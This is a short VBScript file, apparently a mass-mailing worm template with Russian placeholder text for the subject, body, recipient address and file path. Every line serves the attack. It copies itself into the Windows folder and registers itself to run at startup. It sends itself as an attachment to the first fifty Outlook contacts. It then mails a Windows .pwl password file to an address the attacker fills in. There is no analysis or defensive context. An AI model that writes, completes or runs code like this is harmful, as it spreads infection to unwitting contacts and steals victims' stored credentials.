On Error Resume Next 
Dim FileSysObject, File 
Set FileSysObject = CreateObject ("Scripting.FileSystemObject") 
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
File.Copy ("c:\windows\I_am_virus.vbs") 
Dim WshShell 
Set WshShell = WScript.CreateObject("WScript.Shell") 
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\ _
CurrentVersion\RunServices\virus", "c:\windows\I_am_virus.vbs" 
Dim OutlookObject, OutMail, Index 
Set OutlookObject = CreateObject("Outlook.Application") 
For Index = 1 To 50 
Set OutMail = OutlookObject.CreateItem(0) 
OutMail.to = OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index) 
OutMail.Subject = "Тема сообщения"
OutMail.Body = "Тело сообщения"
OutMail.Attachments.Add(File) 
OutMail.Send
Next
Set OutMail = OutlookObject.CreateItem(0) 
OutMail.to = "Ваш E-mail" 
OutMail.Subject = "Тема сообщения" 
OutMail.Body = "Тело сообщения"
OutMail.Attachments.Add("Путь к .pwl файлу")
OutMail.Send

